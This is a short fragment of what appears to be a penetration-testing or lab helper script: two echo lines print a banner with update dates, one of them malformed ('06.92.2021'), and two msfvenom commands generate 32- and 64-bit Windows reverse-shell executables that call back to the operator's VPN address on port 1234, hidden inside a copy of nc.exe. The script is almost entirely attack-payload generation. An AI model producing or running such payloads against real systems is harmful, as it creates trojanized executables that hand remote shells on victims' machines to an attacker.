...
echo -e "Updated 06.29.2021" "Last Full Update 06.92.2021"
echo -e "\e[0m--------------------------------------------"
...
msfvenom -p windows/shell_reverse_tcp LHOST=$vpnip LPORT=1234 -x /usr/share/windows-resources/nc.exe -k -f exe -o win-1234.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$vpnip LPORT=1234 -x /usr/share/windows-resources/nc.exe -k -f exe -o x64-1234.exe
